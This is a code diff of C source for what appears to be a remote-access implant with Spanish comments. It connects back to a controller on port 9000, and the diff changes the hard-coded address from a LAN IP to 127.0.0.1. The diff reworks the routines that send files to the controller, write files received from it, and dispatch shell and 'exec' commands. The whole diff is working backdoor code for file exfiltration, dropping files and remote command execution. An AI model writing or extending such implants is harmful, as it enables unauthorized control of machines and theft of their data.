@@ -31,6 +31,7 @@ int readNdSndFle(int conn, char *file);
 void conection();
 void ash(int conn);
 void _chdir(int conn, char *instruct);
+char* replaceFile(char* command, char* toReplace);
 char* copySource(int conn, char *method);
 
 char *IsElevated(){ 
@@ -138,7 +139,7 @@ void ash(int conn){
     return;
 }
 
-void strtSnd(int conn, char *instruct){
+/*void strtSnd(int conn, char *instruct){
     char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
     char toReplace[] = "download ";
 
@@ -149,7 +150,7 @@ void strtSnd(int conn, char *instruct){
 
 
 }
-
+*/
 int writeAndDecodeData(char *data, char *file){  
     char *base = basename(file);   
  
@@ -168,7 +169,7 @@ int writeAndDecodeData(char *data, char *file){
     return 0;   
 }
 
-int uploadFunc(char *command, int conn){
+/*int uploadFunc(char *command, int conn){
     //Variables necesarias 
     char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
     memset(file, 0, strlen(command) + 1);
@@ -224,9 +225,35 @@ int uploadFunc(char *command, int conn){
     free(downloadedData);
     free(file);
     return 0;
-} 
+}*/
 
-int readNdSndFle(int conn, char *file){
+int uploadFunc(char* command, int conn) {
+    // Encontrar nombre de base (NO RUTA COMPLETA)
+    char* base = basename(replaceFile(command, "upload "));
+
+    FILE* fp;
+    fp = fopen(base, "wb");
+
+    unsigned char recvData[SOCKBUFF];
+    size_t bytesRead;
+
+    while (true) {
+        bytesRead = recv(conn, (char *)recvData, SOCKBUFF, 0);
+        
+        if (strcmp((char *)recvData, "end\0") == 0)
+            break;
+
+        fwrite(recvData, 1, bytesRead, fp);
+        //fwrite(base64_decode(recvData, bytesRead, &bytesRead), 1, bytesRead, fp);
+        memset(recvData, 0, SOCKBUFF);
+        
+    }
+
+    fclose(fp);
+
+}
+
+/*int readNdSndFle(int conn, char *file){
     setlocale(LC_ALL, "en_US.UTF-8");   
 
     FILE *ptr;
@@ -264,6 +291,53 @@ int readNdSndFle(int conn, char *file){
     send(conn, "end\0", strlen("end\0"), 0); 
     //printf("end");
     return 0;
+}*/
+
+char* replaceFile(char* command, char* toReplace) {
+    char* file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
+
+    char* substr = strstr(command, toReplace);
+    size_t remainingLength = strlen(substr + strlen(toReplace));
+    memmove(file, substr + strlen(toReplace), remainingLength + 1);
+    file[remainingLength] = '\0';
+
+    return file;
+}
+
+int readFile(int conn, char *instruct){
+    char *filename = replaceFile(instruct, "download ");
+    long fullBytes = get_file_size(filename);
+
+    char fullBytesStr[100];
+    snprintf(fullBytesStr, 100, "%ld", fullBytes);
+    send(conn, fullBytesStr, strlen(fullBytesStr), 0);
+    sleep(0.3);
+
+    if (fullBytes == -1){
+        send(conn, "-1", 2, 0);
+        return 1;
+    }
+
+    FILE *fp;
+    fp = fopen(filename, "rb");
+
+    char readData[SOCKBUFF];
+    long bytesRead = 0;
+
+    while (true){
+        if ((bytesRead = fread(readData, 1, 2047, fp)) <= 0)
+            break;
+
+        readData[bytesRead] = '\0';
+        send(conn, (char *)readData, bytesRead, 0);
+        memset(readData, 0, SOCKBUFF);
+    }
+
+    fclose(fp);
+    sleep(0.5);
+    //send(conn, "end\0", strlen("end\0"), 0); 
+    return 0;
+
 }
 
 char* copySource(int conn, char *method){
@@ -399,7 +473,7 @@ int mainLoop(int conn){
             ash(conn); 
         
         else if (strstr(instruct, "download ") != NULL)
-            strtSnd(conn, instruct);
+            readFile(conn, instruct);
         
         else if (strstr(instruct, "exec") != NULL){
             excndSend(conn, instruct);
@@ -444,7 +518,7 @@ void conection(){
     
     cltAddr.sin_family = AF_INET;
     cltAddr.sin_port = htons(9000); // Especifcamos puerto 
-    cltAddr.sin_addr.s_addr = inet_addr("192.168.131.33"); // Especificar DIRECCION IP
+    cltAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Especificar DIRECCION IP
 
     int targetConnStatus 
         = connect(conn, (struct sockaddr*)&cltAddr, 
